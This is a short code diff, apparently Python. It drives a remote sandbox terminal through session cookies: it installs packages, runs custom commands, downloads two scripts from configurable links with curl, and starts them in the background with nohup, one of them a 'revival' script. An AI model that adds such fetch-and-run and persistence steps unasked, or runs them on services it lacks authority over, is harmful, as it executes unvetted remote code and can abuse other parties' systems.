+execute_command(sandbox_id, terminal_id, f"pip3 install --upgrade {REQUIREMENTS}", cookies)
+if CUSTOM_COMMANDS:
+    for cmd in CUSTOM_COMMANDS:
+        execute_command(sandbox_id, terminal_id, cmd, cookies)
+execute_command(sandbox_id, terminal_id, f"curl -fsSL -o main_script.py {MAIN_SCRIPT_LINK}", cookies)
+execute_command(sandbox_id, terminal_id, f"curl -fsSL -o revival_script.py {REVIVAL_SCRIPT_LINK}", cookies)
+execute_command(sandbox_id, terminal_id, "nohup python3 main_script.py > main_script.log 2>&1 &", cookies)
+execute_command(sandbox_id, terminal_id, "nohup python3 revival_script.py > revival_script.log 2>&1 &", cookies)
